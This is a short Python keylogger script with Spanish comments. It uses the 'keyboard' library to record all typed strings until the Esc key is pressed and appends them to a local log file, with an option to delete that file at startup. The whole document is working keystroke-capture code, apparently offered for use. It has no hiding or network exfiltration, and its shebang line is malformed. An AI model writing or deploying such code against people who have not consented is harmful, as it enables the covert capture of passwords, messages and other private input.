#!usr/bin/bash
#-*- coding: utf-8 -*-

import keyboard
import os

#ubicación del file que guarda pulsaciones

FILE_NAME = "keylogger_logs.txt"

#determina si el archivo de salida es limpiado cada vez que guarda una tecla

CLEAR_ON_STARTUP = False

#tecla para cerrar programa

TERMINATE_KEY = "esc"

def main():

	if CLEAR_ON_STARTUP:
		os.remove(FILE_NAME)

	output = open(FILE_NAME, "a")

	for string in keyboard.get_typed_strings(keyboard.record(TERMINATE_KEY)):
		output.write(string + "\n")

	output.close()

if __name__ == "__main__":
	main()  